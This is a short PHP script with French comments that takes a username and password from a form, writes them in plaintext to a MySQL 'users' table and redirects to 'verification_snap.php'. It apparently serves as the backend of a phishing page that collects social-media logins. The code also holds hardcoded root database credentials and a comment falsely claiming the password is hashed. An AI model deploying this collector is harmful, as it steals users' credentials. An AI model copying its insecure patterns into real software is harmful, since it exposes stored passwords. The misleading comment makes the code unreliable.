<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ⚡ Paramètres de connexion à la BDD (change avec tes infos)
$host = "catchcat-db";     // ou l'IP de ton serveur MySQL
$user = "root";          // ton utilisateur MySQL
$pass = "root";              // ton mot de passe MySQL
$db   = "catcatch";       // le nom de ta base

// Connexion à la base
$conn = new mysqli($host, $user, $pass, $db);

// Vérifie la connexion
if ($conn->connect_error) {
    die("Erreur de connexion : " . $conn->connect_error);
}

// Vérifie si le formulaire est soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et sécurise les données du formulaire
    $id = $conn->real_escape_string($_POST['id']);
    $password = $conn->real_escape_string($_POST['password']);

    // ⚡ Par sécurité, on hash le mot de passe avant insertion
    // Prépare la requête SQL
    $sql = "INSERT INTO users (username, password) VALUES ('$id', '$password')";

    if ($conn->query($sql) === TRUE) {
    header("Location: verification_snap.php"); /* Redirect browser */
    } else {
        echo "❌ Erreur : " . $conn->error;
    }
}

// Ferme la connexion
$conn->close();
?>
